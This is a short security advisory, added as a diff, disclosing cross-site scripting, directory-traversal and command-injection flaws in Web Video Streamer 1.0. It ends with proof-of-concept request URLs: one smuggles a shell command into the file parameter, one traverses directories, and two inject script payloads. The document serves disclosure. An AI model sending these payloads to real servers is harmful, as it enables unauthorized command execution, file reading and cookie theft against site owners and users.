@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/65350/info
+
+Web Video Streamer is prone to following multiple security vulnerabilities:
+
+1. Multiple cross-site scripting vulnerabilities
+2. A directory-traversal vulnerability
+3. A command-injection vulnerability
+
+A remote attacker can leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site and to view arbitrary local files and directories within the context of the webserver. This may let the attacker steal cookie-based authentication credentials and gain access to sensitive information, which may aid in launching further attacks.
+
+Web Video Streamer 1.0 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/webstreamer-master/player.php?name=drops.avi&file=drop.avi';ls>/tmp/foo;a'&type=video/mp4&t=1389685059
+http://www.example.com/webstreamer-master/index.php?dir=../../../ XSS:
+http://www.example.com/webstreamer-master/player.php?name=%3Cscript%3Ealert%281%29%3C/script%3Etest
+http://www.example.com/webstreamer-master/index.php?dir=../../%3Cscript%3Ealert%281%29%3C/script%3E 
